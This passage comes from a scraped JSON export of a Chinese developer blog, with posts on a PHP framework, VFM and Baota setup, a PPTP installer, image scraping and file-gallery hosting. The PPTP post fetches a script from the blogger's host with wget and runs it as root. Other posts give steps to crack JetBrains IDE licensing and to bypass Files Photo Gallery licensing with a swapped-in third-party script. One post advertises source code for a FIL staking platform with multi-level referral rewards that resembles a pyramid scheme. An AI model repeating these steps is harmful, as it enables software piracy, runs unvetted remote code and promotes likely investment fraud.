12 13 14 15 16 use ay\\lib\\Request; // 设置 dump(Session::set(\u0026#34;user\u0026#34;, \u0026#34;123\u0026#34;)); // 获取 dump(Session::get(\u0026#34;user\u0026#34;)); // 判断是否存在 dump(Session::has(\u0026#34;user\u0026#34;)); // 取出并删除 dump(Session::pull(\u0026#34;user\u0026#34;)); // 删除 Session::delete(\u0026#34;user\u0026#34;); Json返回类 引入json类\n1 2 3 4 5 6 7 8 9 10 11 12 13 use ay\\lib\\Json; $data = [ \u0026#34;list\u0026#34; =\u0026gt; [ [\u0026#34;id\u0026#34; =\u0026gt; 1], [\u0026#34;id\u0026#34; =\u0026gt; 2], [\u0026#34;id\u0026#34; =\u0026gt; 3], ] ]; // 与最外层同级 $arr = [\u0026#34;page\u0026#34; =\u0026gt; 1]; Json::msg(200, \u0026#34;success\u0026#34;, $data, $arr); 返回\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 { \u0026#34;code\u0026#34;: 200, \u0026#34;msg\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;list\u0026#34;: [ { \u0026#34;id\u0026#34;: 1 }, { \u0026#34;id\u0026#34;: 2 }, { \u0026#34;id\u0026#34;: 3 } ] }, \u0026#34;page\u0026#34;: 1 } Xml操作 引入Xml类\n1 2 3 4 5 6 7 use ay\\lib\\Xml; // 生成xml dump(Xml::instance()-\u0026gt;create([\u0026#34;a\u0026#34; =\u0026gt; 1, \u0026#34;d\u0026#34; =\u0026gt; 2])); // 转数组 dump(xml::instance()-\u0026gt;toArray(xml字符串)); 引入dir类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 use ay\\lib\\Dir; // 创建文件夹 dump(Dir::instance()-\u0026gt;create(PUB . \u0026#34;/s\u0026#34;)); // 获取文件扩展名 dump(Dir::instance()-\u0026gt;getExt(PUB . \u0026#34;static/water/water.png\u0026#34;)); // 显示目录树 dump(Dir::instance()-\u0026gt;treeDir(AY)); // 遍历目录内容 dump(Dir::instance()-\u0026gt;tree(AY)); // 删除文件夹 dump(Dir::instance()-\u0026gt;del(PUB . \u0026#34;/s\u0026#34;)); // 获取目录大小 dump(Dir::instance()-\u0026gt;getDirSize(PUB . \u0026#34;static/water\u0026#34;)); // 复制目录 dump(Dir::instance()-\u0026gt;copy(PUB . \u0026#34;static/water\u0026#34;, PUB . \u0026#34;static/water1\u0026#34;)); 图像处理 引入image类\n1 2 3 4 5 6 7 8 9 10 use ay\\lib\\Image; // 初始化image类 详细初始化信息 看构造函数 $image = new Image(); // 生成缩略图并返回缩略图地址 echo $image-\u0026gt;thumb(PUB . \u0026#34;static/water/h.png\u0026#34;, PUB . \u0026#34;static/water/h1.png\u0026#34;, 100, 100, 1); // 添加水印 var_dump($image-\u0026gt;water(PUB . \u0026#34;static/water/h.png\u0026#34;, PUB . \u0026#34;static/water/h2.png\u0026#34;, [100, 100], \u0026#34;\u0026#34;, 1, \u0026#34;123\u0026#34;)); 缓存类 引入Cache类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 use ay\\lib\\Cache; // 设置指定缓存 dump(Cache::instance()-\u0026gt;set(\u0026amp;#039;data\u0026amp;#039;, \u0026amp;#039;123\u0026amp;#039;)); // 取出指定缓存 dump(Cache::instance()-\u0026gt;get(\u0026amp;#039;data\u0026amp;#039;)); // 删除指定缓存 Cache::instance()-\u0026gt;del(\u0026amp;#039;data\u0026amp;#039;); // 删除全部缓存 Cache::instance()-\u0026gt;delAll(); dump(Cache::instance()-\u0026gt;get(\u0026amp;#039;data\u0026amp;#039;)); Curl类 引入Curl类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 use ay\\lib\\Curl; $url = \u0026#34;https://blog.aaayun.cc/test.php\u0026#34;; $ua = \u0026amp;#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36\u0026amp;#039;; dump( Curl::url($url) -\u0026gt;userAgent($ua) // 设置ua -\u0026gt;referer(\u0026amp;#039;\u0026amp;#039;) // 设置来源 -\u0026gt;param([\u0026amp;#039;user\u0026amp;#039; =\u0026gt; \u0026amp;#039;测试数据\u0026amp;#039;]) // 设置参数 -\u0026gt;time(10) // 最大超时时间 -\u0026gt;proxy(\u0026amp;#039;127.0.0.1\u0026amp;#039;, 1080) // 设置代理 -\u0026gt;show(true) // 显示repose信息 -\u0026gt;cert(\u0026amp;#039;\u0026amp;#039;) // 设置证书 -\u0026gt;post() ); Upload类 引入Upload类\n1 2 3 4 use ay\\lib\\Upload; $upload = new Upload(PUB . \u0026amp;#039;upload/\u0026amp;#039;, [\u0026amp;#039;txt\u0026amp;#039;]); dump($upload-\u0026gt;operate(\u0026amp;#039;file\u0026amp;#039;)); Env类 引入Env类\n1 2 3 use ay\\lib\\Env; dump(Env::get(\u0026amp;#039;data.debug\u0026amp;#039;)); Api类 详细使用请看Api控制器\n助手函数 R方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 获取所有post参数 dump(R(\u0026amp;#039;post.\u0026amp;#039;)); // 验证post下ids参数是否存在 dump(R(\u0026amp;#039;?post.ids\u0026amp;#039;)); // 获取所有get参数 dump(R(\u0026amp;#039;get.\u0026amp;#039;)); // 验证get下id参数是否存在 dump(R(\u0026amp;#039;?get.id\u0026amp;#039;)); // 获取所有参数 注意 会多返回一个s参数 此参数为当前路由 dump(R(\u0026amp;#039;param\u0026amp;#039;)); // 获取所有文件参数 dump(R(\u0026amp;#039;file\u0026amp;#039;)); // 验证file下file参数是否存在 dump(R(\u0026amp;#039;?file.file\u0026amp;#039;)); C方法 1 2 3 4 5 6 7 8 9 10 // 输出全部预定义 dump(C()); // 改变指定并返回值 dump(C(\u0026amp;#039;APP.DEBUG\u0026amp;#039;, 123)); // 增加并返回值 dump(C(\u0026amp;#039;AAA.ACV\u0026amp;#039;, 123)); dump(C()); success\u0026amp;\u0026amp;fail方法 1 2 success(\u0026amp;#039;操作成功\u0026amp;#039;, \u0026amp;#039;http://baidu.com\u0026amp;#039;); fail(\u0026amp;#039;操作失败\u0026amp;#039;, \u0026amp;#039;http://baidu.com\u0026amp;#039;); 无限级分类树 1 2 3 4 5 6 $arr = [ [\u0026amp;#039;id\u0026amp;#039; =\u0026gt; 1, \u0026amp;#039;pid\u0026amp;#039; =\u0026gt; 0, \u0026amp;#039;name\u0026amp;#039; =\u0026gt; \u0026amp;#039;一级\u0026amp;#039;], [\u0026amp;#039;id\u0026amp;#039; =\u0026gt; 2, \u0026amp;#039;pid\u0026amp;#039; =\u0026gt; 1, \u0026amp;#039;name\u0026amp;#039; =\u0026gt; \u0026amp;#039;二级\u0026amp;#039;], [\u0026amp;#039;id\u0026amp;#039; =\u0026gt; 3, \u0026amp;#039;pid\u0026amp;#039; =\u0026gt; 2, \u0026amp;#039;name\u0026amp;#039; =\u0026gt; \u0026amp;#039;三级\u0026amp;#039;], ]; dump(tree($arr, \u0026amp;#039;id\u0026amp;#039;, \u0026amp;#039;pid\u0026amp;#039;)); 其它常用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // 导入extends目录下扩展包 extends(\u0026amp;#039;pay/alipay.php\u0026amp;#039;); $pay = new AliPay(); // 获取来源ip dump(getIp()); // 判断当前是否是ssl dump(is_ssl()); // 抛出异常 halt(); // 跳转 go(\u0026amp;#039;http://baidu.com/\u0026amp;#039;, 3, \u0026#34;系统正在重定向\u0026#34;); ","date":"2022-06-16T15:29:42Z","permalink":"https://blog.aaayun.cc/archives/842.html","title":"AYPHP轻量级框架"},{"content":" 博主在网上找了很多免费版本只有这款是最新的\n现在的个人数据越来越多，数据交互变得频繁。每当有需要临时存储的数据而身边又没有合适的存储介质，或者家里或工作中需要下载的文件，都是非常不方便的。这时候你就需要使用通用网盘了。有很多服务提供商提供云存储，但一般你需要支付空间或会员制度。免费云盘速度慢，内容有限。也有很多私有的网盘程序，但是比较臃肿，对服务器的要求也比较高。那么为什么不用VFM来搭建一个轻量级简单的私有云盘呢？\nVFM是外国个人团队的付费作品。作为私有云盘，其功能可以涵盖方方面面。存储空间的容量和下载速度只取决于你家的建筑环境(VPS)。\n开始安装 环境需要 硬件配置不低于单核 512M 内存及 50M 磁盘空间。 系统推荐使用 Centos。 WEB 端使用 Apache 与 PHP（PHP 需要高于 5.5 的版本）。 VFM 源码。 配置 VFM 系统及环境都配置好之后将 VFM 上传至 WEB 根目录，并确保下图红框内文件是 755 权限（如果权限不足会导致无法更改配置及创建文件夹和添加用户）。 打开预设的 WEB 地址并输入账户密码进入后台设置，默认账户 admin 密码 password。 进入后台之后可以将语言更改为中文并自定义站点名称，也可以根据需要设置伪静态（漂亮的链接）或者直链支持。 权限部分可以根据自己的需求进行更改，比如你有多用户需求就需要设置 admin 账户的权限，有远程上传的需求就需要开启功能并设置上传文件后缀限制。 这里是一些基本设置，是否开启注册（开启注册需要同时启用下方的电邮选项并填入信息）及文件分享设置。 伪静态设置 如果你用的是apache则不需要设置\nlocation / { index index.php; if (!-e $request_filename) { rewrite /download/(.*)/sh/(.*)/share/(.*) /vfm-admin/vfm-downloader.php?q=$1\u0026amp;sh=$2\u0026amp;share=$3 last; } rewrite /download/(.*)/h/(.*) /vfm-admin/vfm-downloader.php?q=$1\u0026amp;h=$2 last; rewrite /download/zip/(.*)/n/(.*) /vfm-admin/vfm-downloader.php?zip=$1\u0026amp;n=$2 last; } location /uploads/ { deny all; } location /vfm-admin/_content1/ { deny all; } location /vfm-admin/tmp/ { deny all; } VFM 详细特征 文件和文件夹管理 文件夹树导航 重命名文件和文件夹 按名称，日期和大小排序的项目 分页 下载文件夹 集体行动 下载多个文件为.zip 档案 删除文件和文件夹 通过目录移动文件 通过目录复制文件 服务器端通过 Ajax 处理列表 用户 具有自定义权限的多个角色 为每个用户分配一个或多个特定目录 每个用户可选的最大可用空间 用户注册（可选） 用户面板 个人资料图片和默认头像 找回密码 用户之间上传通知 向新用户发送电子邮件通知 上传 上传 BIG 文件 远程上传器 暂停 / 恢复 拖放上传器 * 多个文件上传 * 上传进度 * 文件共享 电子邮件表格 链接到期时间 可选的密码保护链接 媒体 快速图像预览 * 内联缩略图 音频播放器 视频播放器 搜索 全球搜索 快速搜索模块 归档地图导航 安全 IP 黑名单 / 白名单 用于登录和共享链接的可选 CAPTCHA 安全代码 预防的热门链接 * 统计 每日 / 每周 / 每月报告 日期范围的趋势图表 将日志导出为.csv 任何活动的可选电子邮件通知 国际 多语言（包括 16+） RTL 支持 翻译编辑 样式 包括 25 多张皮肤 可定制的徽标，标题，说明 可定制的警报 自定义电子邮件 HTML 模板 自定义管理面板配色方案 下载地址\nveno-file-manager-v3.7.5\n","date":"2022-06-10T18:02:00Z","permalink":"https://blog.aaayun.cc/archives/796.html","title":"VFM 3.7.5 源码 – 一个极简的 PHP 私人云盘！"},{"content":"由于某些原因，需要用一行命令来创建宝塔以及数据库，此函数基于官方的API\n注意：宝塔创建网站需要使用php 以下代码使用php80\n下面代码用到了第三方库github.com/spf13/viper\nmd5的计算就不贴了很简单\nBtServer主文件 /* * @Author anderyly * @email admin@aaayun.cc * @link http://blog.aaayun.cc/ * @copyright Copyright (c) 2022 */ package ay import ( \u0026quot;encoding/json\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;io/ioutil\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;runtime\u0026quot; \u0026quot;strconv\u0026quot; \u0026quot;strings\u0026quot; \u0026quot;time\u0026quot; ) type BtServer struct { } // GetSign 获取签名 func (con BtServer) GetSign() map[string]string { res := make(map[string]string, 2) res[\u0026quot;request_time\u0026quot;] = strconv.FormatInt(time.Now().Unix(), 10) res[\u0026quot;request_token\u0026quot;] = MD5(res[\u0026quot;request_time\u0026quot;] + MD5(Yaml.GetString(\u0026quot;bt.code\u0026quot;))) return res } // GetSiteId 获取网站id func (con BtServer) GetSiteId() { type r struct { Where string `json:\u0026quot;where\u0026quot;` Page string `json:\u0026quot;page\u0026quot;` Data []struct { Id int `json:\u0026quot;id\u0026quot;` Name string `json:\u0026quot;name\u0026quot;` Path string `json:\u0026quot;path\u0026quot;` Status string `json:\u0026quot;status\u0026quot;` Ps string `json:\u0026quot;ps\u0026quot;` Addtime string `json:\u0026quot;addtime\u0026quot;` Edate string `json:\u0026quot;edate\u0026quot;` Type string `json:\u0026quot;type\u0026quot;` TypeVersion string `json:\u0026quot;type_version\u0026quot;` BackupCount int `json:\u0026quot;backup_count\u0026quot;` Domain int `json:\u0026quot;domain\u0026quot;` Ssl int `json:\u0026quot;ssl\u0026quot;` } `json:\u0026quot;data\u0026quot;` } url := Yaml.GetString(\u0026quot;bt.panel\u0026quot;) + \u0026quot;/data?action=getData\u0026amp;table=sites\u0026quot; data := con.GetSign() data[\u0026quot;limit\u0026quot;] = \u0026quot;1\u0026quot; data[\u0026quot;search\u0026quot;] = Yaml.GetString(\u0026quot;bt.site\u0026quot;) res := con.Http(url, data) var rj r json.Unmarshal([]byte(res), \u0026amp;rj) siteId := 0 if len(rj.Data) == 1 { for _, v := range rj.Data { siteId = v.Id } } Yaml.Set(\u0026quot;bt.site_id\u0026quot;, siteId) Yaml.WriteConfig() } func (con BtServer) Http(url string, data map[string]string) string { str := \u0026quot;\u0026quot; for k, v := range data { str += k + \u0026quot;=\u0026quot; + v + \u0026quot;\u0026amp;\u0026quot; } resp, err := http.Post(url, \u0026quot;application/x-www-form-urlencoded\u0026quot;, strings.NewReader(strings.TrimRight(str, \u0026quot;\u0026amp;\u0026quot;))) if err != nil { fmt.Println(err) } defer resp.Body.Close() body, err := ioutil.ReadAll(resp.Body) if err != nil { // handle error } return string(body) } // Create 创建网站 func (con BtServer) Create() (bool, string) { type r struct { SiteStatus bool `json:\u0026quot;siteStatus\u0026quot;` SiteId int `json:\u0026quot;siteId\u0026quot;` FtpStatus bool `json:\u0026quot;ftpStatus\u0026quot;` DatabaseStatus bool `json:\u0026quot;databaseStatus\u0026quot;` Status bool `json:\u0026quot;status\u0026quot;` Msg string `json:\u0026quot;msg\u0026quot;` } url := Yaml.GetString(\u0026quot;bt.panel\u0026quot;) + \u0026quot;/site?action=AddSite\u0026quot; data := con.GetSign() pass := MD5(strconv.FormatInt(time.Time{}.Unix(), 10))[:10] Yaml.Set(\u0026quot;mysql.user\u0026quot;, \u0026quot;shop\u0026quot;) Yaml.Set(\u0026quot;mysql.database\u0026quot;, \u0026quot;shop\u0026quot;) Yaml.Set(\u0026quot;mysql.password\u0026quot;, pass) Yaml.Set(\u0026quot;mysql.localhost\u0026quot;, \u0026quot;127.0.0.1\u0026quot;) Yaml.Set(\u0026quot;mysql.port\u0026quot;, \u0026quot;3306\u0026quot;) if runtime.GOOS == \u0026quot;linux\u0026quot; { data[\u0026quot;path\u0026quot;] = \u0026quot;/www/wwwroot/shop\u0026quot; } else { data[\u0026quot;path\u0026quot;] = \u0026quot;D:/wwwroot/shop\u0026quot; } data[\u0026quot;webname\u0026quot;] = `{\u0026quot;domain\u0026quot;:\u0026quot;` + Yaml.GetString(\u0026quot;bt.site\u0026quot;) + `\u0026quot;,\u0026quot;domainlist\u0026quot;:[],\u0026quot;count\u0026quot;:0}` data[\u0026quot;type_id\u0026quot;] = \u0026quot;0\u0026quot; data[\u0026quot;type\u0026quot;] = \u0026quot;PHP\u0026quot; data[\u0026quot;version\u0026quot;] = \u0026quot;80\u0026quot; data[\u0026quot;port\u0026quot;] = \u0026quot;80\u0026quot; data[\u0026quot;ps\u0026quot;] = \u0026quot;微营销\u0026quot; data[\u0026quot;ftp\u0026quot;] = \u0026quot;false\u0026quot; data[\u0026quot;sql\u0026quot;] = \u0026quot;true\u0026quot; data[\u0026quot;codeing\u0026quot;] = \u0026quot;utf8mb4\u0026quot; data[\u0026quot;datauser\u0026quot;] = \u0026quot;shop\u0026quot; data[\u0026quot;datapassword\u0026quot;] = pass res := con.Http(url, data) var rj r json.Unmarshal([]byte(res), \u0026amp;rj) Yaml.Set(\u0026quot;bt.site_id\u0026quot;, rj.SiteId) if rj.SiteStatus \u0026amp;\u0026amp; rj.DatabaseStatus { Yaml.WriteConfig() return true, \u0026quot;success\u0026quot; } else { return false, rj.Msg } } // GetDomain 获取域名 func (con BtServer) GetDomain() []map[string]string { type r struct { Id int `json:\u0026quot;id\u0026quot;` Pid int `json:\u0026quot;pid\u0026quot;` Name string `json:\u0026quot;name\u0026quot;` Port int `json:\u0026quot;port\u0026quot;` Addtime string `json:\u0026quot;addtime\u0026quot;` } url := Yaml.GetString(\u0026quot;bt.panel\u0026quot;) + \u0026quot;/data?action=getData\u0026amp;table=domain\u0026quot; data := con.GetSign() data[\u0026quot;search\u0026quot;] = Yaml.GetString(\u0026quot;bt.site_id\u0026quot;) data[\u0026quot;list\u0026quot;] = \u0026quot;true\u0026quot; res := con.Http(url, data) var rj []r json.Unmarshal([]byte(res), \u0026amp;rj) var s []map[string]string for _, v := range rj { s = append(s, map[string]string{ \u0026quot;id\u0026quot;: strconv.Itoa(v.Id), \u0026quot;name\u0026quot;: v.Name, \u0026quot;port\u0026quot;: strconv.Itoa(v.Port), }) } return s } // DelDomain 删除域名 func (con BtServer) DelDomain(domain, port string) (bool, string) { type r struct { Status bool `json:\u0026quot;status\u0026quot;` Msg string `json:\u0026quot;msg\u0026quot;` } url := Yaml.GetString(\u0026quot;bt.panel\u0026quot;) + \u0026quot;/site?action=DelDomain\u0026quot; data := con.GetSign() data[\u0026quot;id\u0026quot;] = Yaml.GetString(\u0026quot;bt.site_id\u0026quot;) data[\u0026quot;webname\u0026quot;] = Yaml.GetString(\u0026quot;bt.site\u0026quot;) data[\u0026quot;domain\u0026quot;] = domain data[\u0026quot;port\u0026quot;] = port res := con.Http(url, data) var rj r json.Unmarshal([]byte(res), \u0026amp;rj) return rj.Status, rj.Msg } // SetDomain 设置域名 func (con BtServer) SetDomain(domain string) (bool, string) { type r struct { Status bool `json:\u0026quot;status\u0026quot;` Msg string `json:\u0026quot;msg\u0026quot;` } url := Yaml.GetString(\u0026quot;bt.panel\u0026quot;) + \u0026quot;/site?action=AddDomain\u0026quot; data := con.GetSign() data[\u0026quot;id\u0026quot;] = Yaml.GetString(\u0026quot;bt.site_id\u0026quot;) data[\u0026quot;webname\u0026quot;] = Yaml.GetString(\u0026quot;bt.site\u0026quot;) data[\u0026quot;domain\u0026quot;] = domain res := con.Http(url, data) var rj r json.Unmarshal([]byte(res), \u0026amp;rj) return rj.Status, rj.Msg } // UpdateDomain 更新网站域名 func (con BtServer) UpdateDomain(str string) (bool, string) { domainArr := strings.Split(str, \u0026quot;=\u0026quot;) btDomain := con.GetDomain() for _, v := range domainArr { domainS := 0 for _, v1 := range btDomain { if v == v1[\u0026quot;name\u0026quot;] { domainS = 1 break } } if domainS != 1 { con.SetDomain(v) } } return true, \u0026quot;success\u0026quot; } yaml文件 bt: code: QGg5Ct3BlSKlvZmvVk537vuVToJ8j8ci panel: http://127.0.0.1:8888 site: baidu1.com site_id: 1 domain: http://127.0.0.1:8082 mysql: database: shop localhost: 127.0.0.1 password: root port: 3306 user: root ","date":"2022-06-10T10:17:24Z","permalink":"https://blog.aaayun.cc/archives/799.html","title":"golang使用宝塔API快速建站"},{"content":"废话不多说直接上脚本 1 2 3 wget https://uss.aaayun.cc/typecho/uploads/2022/05/3296326676.txt -O CentOS7-pptp-host1plus.sh chmod +x ./CentOS7-pptp-host1plus.sh ./CentOS7-pptp-host1plus.sh -u your_username -p your_password 可在-u、-p后随意更改自己的登录用户名和密码。但密码长度必须大于8个 ASCII字符，否则为了安全，脚本将会随机生成密码。\n脚本命令及配置 设置账号 1 vim /etc/ppp/chap-secrets 修改dns(ms_dns) 1 vim /etc/ppp/options.pptpd 重启服务 1 /bin/systemctl restart pptpd.service 连不上VPN 检查是否开放了 1723 端口，一般是因为这个原因吧\n打不开网页 1 vim /etc/ppp/ip-up 在 exit 0 前写入 : ifconfig $1 mtu 1500\n","date":"2022-05-23T19:39:00Z","permalink":"https://blog.aaayun.cc/archives/791.html","title":"Centos7一键安装pptp脚本"},{"content":"{dplayer src=\u0026ldquo;https://uss.aaayun.cc/typecho/uploads/2022/05/1024311815.mp4\"/}\n","date":"2022-05-21T17:40:00Z","permalink":"https://blog.aaayun.cc/archives/788.html","title":"人生"},{"content":"找了很多版本都是2020.1激活的，比如像phpstorm2020版就没有php8提示，废话不多说下面开始\n此激活方式支持jb公司的 2021 后所有产品\n1.下载激活文件，并解压到一个路径下\nja-netfilter.zip\n2.使用激活码进入ide\nkey.txt\n3.进入配置文件\n4.修改并保存 重启ide\n-javaagent:第一步解压文件后的路径\\ja-netfilter.jar 5.成功\n","date":"2022-03-05T23:41:00Z","permalink":"https://blog.aaayun.cc/archives/773.html","title":"最新idea激活2021版"},{"content":" 开启客服消息 开启消息推送 地址 消息加密方式：可以根据自己需要选择，本例选择”兼容模式“。\n数据格式：json相对于xml来说，从压缩效率及传输效率更具优势，这里我们选json。\n示例代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 \u0026lt;?php /** * @author anderyly * @email admin@aaayun.cc * @link http://blog.aaayun.cc * @copyright Copyright (c) 2022 */ use ay\\lib\\Curl; class WeChat { public static $token = \u0026#39;xxx\u0026#39;; // Token(令牌) public static $key = \u0026#39;xxx\u0026#39;; // EncodingAESKey(消息加密密钥) public static $appid = \u0026#39;xxx\u0026#39;; public static $secret = \u0026#39;xxx\u0026#39;; public function index() { // $this-\u0026gt;checkSignature(self::$token); // 验证 $data = file_get_contents(\u0026#39;php://input\u0026#39;); $this-\u0026gt;send($data, self::$appid, self::$secret); } public function checkSignature($token) { $signature = $_GET[\u0026#34;signature\u0026#34;]; $timestamp = $_GET[\u0026#34;timestamp\u0026#34;]; $nonce = $_GET[\u0026#34;nonce\u0026#34;]; $token = $token; $tmpArr = array($token, $timestamp, $nonce); sort($tmpArr, SORT_STRING); $tmpStr = implode( $tmpArr ); $tmpStr = sha1( $tmpStr ); if ($tmpStr == $signature ) { exit($_GET[\u0026#39;echostr\u0026#39;]); } } public function getAccessToken($appid, $secret) { $url = \u0026#34;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential\u0026amp;appid=\u0026#34; . $appid . \u0026#34;\u0026amp;secret=\u0026#34; . $secret; $row = Curl::url($url)-\u0026gt;get(); $row = json_decode($row, true); return $row[\u0026#39;access_token\u0026#39;] ?? false; } public function send($data, $appid, $secret) { $data = json_decode($data, true); $accessToken = $this-\u0026gt;getAccessToken($appid, $secret); $url = \u0026#34;https://api.weixin.qq.com/cgi-bin/message/custom/send?access_token=\u0026#34; . $accessToken; $r = [ \u0026#34;touser\u0026#34; =\u0026gt; $data[\u0026#39;FromUserName\u0026#39;] ]; $r[\u0026#39;msgtype\u0026#39;] = \u0026#34;link\u0026#34;; $r[\u0026#39;link\u0026#39;] = [ \u0026#34;title\u0026#34; =\u0026gt; \u0026#34;轻风云\u0026#34;, \u0026#34;description\u0026#34; =\u0026gt; \u0026#34;云淡风轻，于事安然\u0026#34;, \u0026#34;url\u0026#34; =\u0026gt; \u0026#34;http://blog.aaayun.cc\u0026#34;, \u0026#34;thumb_url\u0026#34; =\u0026gt; \u0026#34;http://blog.aaayun.cc/avatar.png\u0026#34; ]; $json = json_encode($r, JSON_UNESCAPED_UNICODE); Curl::url($url)-\u0026gt;param($json)-\u0026gt;post(\u0026#39;json\u0026#39;); } } ","date":"2022-02-14T17:56:00Z","permalink":"https://blog.aaayun.cc/archives/770.html","title":"基于PHP实现微信小程序客服消息功能"},{"content":"利用 rc.local 文件实现脚本开机自启: 新建 /etc/rc.local 文件 1 vim /etc/rc.local 粘贴以下模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/bin/sh -e # # rc.local # # This script is executed at the end of each multiuser runlevel. # Make sure that the script will \u0026#34;exit 0\u0026#34; on success or any other # value on error. # # In order to enable or disable this script just change the execution # bits. # # By default this script does nothing. exit 0 在 exit 0 上方插入你需要自启的命令(一行一个)后保存文件\n给脚本加上 755 权限 1 sudo chmod +755 /etc/rc.local 调试脚本(可选) 1 sudo /etc/rc.local # 使用 sudo 模拟 root 用户开机自启 /etc/rc.local 文件 ps:如果第 5 步模拟启动脚本没有报错，那我们就可以重启电脑看看是否可以成功实现脚本开机自启。\n重启进入系统后我们可以通过 systemctl status rc-local.service 查看 rc-local 的 运行状态 ，如果结果显示的是 active (exited) 则说明你的脚本已经成功执行，反之如果结果显示 failed ,那么你需要检查一下脚本是否哪里有问题。\n这里提供几个可能导致脚本无法正常启动的原因:\n可能导致脚本无法执行的原因1. 执行脚本的用户不一致 由于 rc.local 开机自启的时候是以 root 用户执行的，这里很多人会忽略了一个问题，很多情况下你的命令是必须要普通用户执行的。 多余的 sudo，前面已经提到 rc.local 开机时是以 root 用户启动的，所以写在 rc.local 文件中命令不需要带有 sudo 前缀(实际上就算你带有了 sudo 前缀也不会产生错误)。 ps:个人建议每当往 rc.local 文件中添加了一个需要自启的命令时，可以先用 sudo /etc/rc.local 命令模拟一下看看是否能够执行成功(如果执行失败也能够直观地看到出错的原因)，这样能够有效减少你重启电脑来调试的次数。\n","date":"2021-12-14T22:28:52Z","permalink":"https://blog.aaayun.cc/archives/768.html","title":"deepin下开机自启脚本"},{"content":" 非资金盘系统，项目可长期运营\n预览 程序说明 源码采用php+golang+uniapp编写，可八端打包使用（安卓 iOS 小程序等）\n静态奖励 存fil赚fil，2个fil起投，静态每天0.5%到3%收益，三倍出局\n动态奖励 1.直推10%\n2.节点服务费奖励\nV1 业绩累积10fil享受名下会员每日静态收益1％节点服务费\nV2 业绩累积30fil 享受名下会员每日静态收益2%节点服务费\nV3业绩累积100fil享受名下会员每日静态收益3%节点服务费\nV4业绩累积200fil享受名下会员每日静态收益4%节点服务费\nV5业绩累计500fil享受名下会员每日静态收益5%节点服务费\nV6业绩累计1000fil享受名下会员每日静态收益7%节点服务费\nV7业绩累计2000fil享受名下会员每日静态收益10%节点服务费\nv8业绩累计数3000fil享受名下会员每日静态收益14%节点服务费\nv9业绩累积6000fil享受名下会员每日静态收益18%节点服务费\nv10业绩累积10000fil享受名下会员每日静态收益20%节点服务费 直推一人拿一代，直推两人拿两代，以此类推。\n3.平级奖\n当名下会员与你平级时，可获取直接推荐者每日动静态收益的10%\n","date":"2021-11-18T02:51:00Z","permalink":"https://blog.aaayun.cc/archives/755.html","title":"飞尔国际源码"},{"content":"批量采集美女写真等图片做图片站 批量采集美女写真等图片到typecho上，图片可选择本地化，内含多种数据源，程序采用golang开发，可进行多线程采集，经测试很稳定，目前可采集到2400篇文章，2w多图片。可自行编译，也有打包好的\n? http://www.52rm.cc\n编译 1 2 3 4 git clone https://github.com/Anderyly/beautyPictureCollection.git warm cd warm go mod init \u0026amp;\u0026amp; go mod tidy go build 数据库 在typecho_contents表增加link字段 vachar 255即可 用于存储采集来源页 运行 请配置set.ini内容 1 2 chomd +x warm ./warm github\n","date":"2021-10-11T15:14:00Z","permalink":"https://blog.aaayun.cc/archives/747.html","title":"批量采集美女写真等图片做图片站"},{"content":" 介绍 Files Photo Gallery是一个单文件PHP目录程序，可以放置到服务器上的任何目录，立即拥有一个文件和文件夹预览目录。它支持所有文件类型，并允许您预览图像、视频、音频和代码。\n链接 官网： https://files.photo.gallery\n演示： https://files.photo.gallery/demo\n文档： https://forum.photo.gallery/viewtopic.php?f=66\u0026t=9964\n源码：https://cdn.jsdelivr.net/npm/files.photo.gallery/index.php\n支持 单个文件只需将其放入服务器上的任何目录即可。 实时搜索和排序文件。 高级列表和库布局，可以实时切换。 预览 IPTC、EXIF 和 GPS 地图以查看您的照片。 使用缓存机制和 CDN 快速加载。 高级树菜单导航显示整个目录结构。 美丽的代码荧光笔来查看和编辑代码格式。 可选登录以保护访问。 安装 将下载得到的index.php文件放置到需要的网站目录，打开目录即可；\nPHP版本需要5.5以上，PHP扩展程序安装需求：GD mbstring fileinfo exif\n宝塔面板安装PHP时已经默认安装了GD和mbstring扩展程序，所以无需额外安装\n如果没有别的需求也可以不用安装fileinfo和exif扩展，程序依然可以正常使用\n破解 Files Photo Gallery是完全开源的，免费版和授权版一致，没有任何区别\n只是免费版每次会弹出授权窗口，点击一下No thanks!即可关闭\n破解授权有两个方法，一是JS本地化，二是JS网络化，当然JS网络化会更加方便快捷\nJS本地化： 打开index.php找到代码：\n将其替换为：\n再在同目录新建名为js的文件夹，然后下载files.js文件放置在其中即可；\nfiles.js文件下载地址：\nhttps://cdn.jsdelivr.net/gh/sunpma/cdn/other/files.js\nJS网络化： 打开index.php找到代码：\n将其替换为如下代码即可；\n替换代码：\n1 \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/sunpma/cdn/other/files.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 常用配置参数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 根目录配置 \u0026#39;root\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, // 相对路径或者绝对路径，不填代表当前目录，二级目录无需 / 符号 \u0026#39;start_path\u0026#39; =\u0026gt; false, // 分配加载到视图中的第一个目录，默认情况下，该目录与root目录相同 // 授权登录 \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, // 用户账号（留空关闭） \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, // 用户密码（留空关闭） // 排除文件或者目录 \u0026#39;files_exclude\u0026#39; =\u0026gt; 